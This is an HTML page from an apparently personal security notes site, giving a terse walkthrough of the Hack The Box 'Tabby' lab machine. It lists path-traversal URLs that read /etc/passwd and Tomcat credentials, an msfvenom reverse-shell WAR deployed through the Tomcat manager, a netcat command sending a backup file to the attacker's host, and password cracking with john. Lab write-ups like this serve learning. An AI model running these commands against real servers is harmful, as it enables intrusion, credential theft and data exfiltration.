@@ -1,0 +1,184 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tabby walkthrough &mdash; docs 0.1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="../../../_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../../_static/documentation_options.js?v=2709fde1"></script>
+      <script src="../../../_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="../../../_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="Photoshop home Page" href="../../../photoshop/index.html" />
+    <link rel="prev" title="Pivot Page" href="index.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            docs
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../../coding/index.html">Coding Homepage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../hacking/index.html">Hacking Home Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">Cyber Defense Home Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../IT/index.html">IT Homepage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../interview_questions/index.html">interview questions</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../../index.html">Walkthroughs Page</a><ul class="current">
+<li class="toctree-l2 current"><a class="reference internal" href="../index.html">Hack The Box Page</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="../SUID_exploit/index.html">SUID home Page</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../info_disclosure/index.html">Information Disclosure home Page</a></li>
+<li class="toctree-l3 current"><a class="reference internal" href="index.html">Pivot Page</a><ul class="current">
+<li class="toctree-l4 current"><a class="current reference internal" href="#">Tabby walkthrough</a></li>
+<li class="toctree-l4"><a class="reference internal" href="index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../../photoshop/index.html">Photoshop home Page</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">docs</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../../index.html">Walkthroughs Page</a></li>
+          <li class="breadcrumb-item"><a href="../index.html">Hack The Box Page</a></li>
+          <li class="breadcrumb-item"><a href="index.html">Pivot Page</a></li>
+      <li class="breadcrumb-item active">Tabby walkthrough</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/walkthroughs/HTB/pivot/tabby.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="tabby-walkthrough">
+<h1>Tabby walkthrough<a class="headerlink" href="#tabby-walkthrough" title="Link to this heading"></a></h1>
+<p>We first run nmap. We get the following.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sC -sV -T4 -p- 10.10.10.194 | tee tabby.nmap</span>
+<span class="go">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey:</span>
+<span class="go">|   3072 453c341435562395d6834e26dec65bd9 (RSA)</span>
+<span class="go">|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)</span>
+<span class="go">|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)</span>
+<span class="go">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+<span class="go">|_http-title: Mega Hosting</span>
+<span class="go">|_http-server-header: Apache/2.4.41 (Ubuntu)</span>
+<span class="go">8080/tcp open  http    Apache Tomcat</span>
+<span class="go">|_http-title: Apache Tomcat</span>
+<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</pre></div>
+</div>
+<section id="http-8080">
+<h2>HTTP 8080<a class="headerlink" href="#http-8080" title="Link to this heading"></a></h2>
+<p>We then checkout <a href="#id1"><span class="problematic" id="id2">`</span></a><a class="reference external" href="http://10.10.10.194:8080/">http://10.10.10.194:8080/</a> ` and find some useful information.</p>
+<blockquote>
+<div><ul class="simple">
+<li><p>It runs tomcat 9</p></li>
+<li><p><a class="reference external" href="http://10.10.10.194:8080/manager/html">http://10.10.10.194:8080/manager/html</a></p></li>
+<li><p><a class="reference external" href="http://10.10.10.194:8080/host-manager/html">http://10.10.10.194:8080/host-manager/html</a></p></li>
+<li><p>Users are defined in /etc/tomcat9/tomcat-users.xml</p></li>
+</ul>
+</div></blockquote>
+</section>
+<section id="http-80">
+<h2>HTTP 80<a class="headerlink" href="#http-80" title="Link to this heading"></a></h2>
+<p>We find files and the hostname on <cite>http://10.10.10.194</cite>. There we can find <cite>/etc/passwd</cite></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://megahosting.htb/news.php?file=../../../../etc/passwd</span>
+</pre></div>
+</div>
+<p>We then find tomcat user’s creds with curl</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml</span>
+
+<span class="go">U = tomcat</span>
+<span class="go">P = $3cureP4s5w0rd123!</span>
+</pre></div>
+</div>
+<p>msfvenom -p java/shell_reverse_tcp lhost=10.10.14.5 lport=4444 -f war -o rev.10.10.14.5-4444.war</p>
+<p>curl -u ‘tomcat:$3cureP4s5w0rd123!’ http://10.10.10.194:8080/manager/text/deploy?path=/mynameis –upload-file rev.10.10.14.5-4444.war</p>
+<p>nc –lvnp 4444</p>
+<p>curl <a class="reference external" href="http://10.10.10.194:8080/mynameis">http://10.10.10.194:8080/mynameis</a></p>
+<p>cat 16162020_backup.zip | nc 10.10.14.5 443</p>
+<p>nc -lvnp 443 &gt; 16162020_backup.zip</p>
+<p>zip2john 16162020_backup.zip &gt; 16162020_backup.zip.john</p>
+<p>john 16162020_backup.zip.john –wordlist=/usr/share/wordlists/rockyou.txt</p>
+<p><a class="reference external" href="mailto:admin&#37;&#52;&#48;it">admin<span>&#64;</span>it</a></p>
+<p>Su – ash</p>
+<p><a class="reference external" href="mailto:Admin&#37;&#52;&#48;it">Admin<span>&#64;</span>it</a></p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="index.html" class="btn btn-neutral float-left" title="Pivot Page" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../../../photoshop/index.html" class="btn btn-neutral float-right" title="Photoshop home Page" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025, mynameisORIG.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
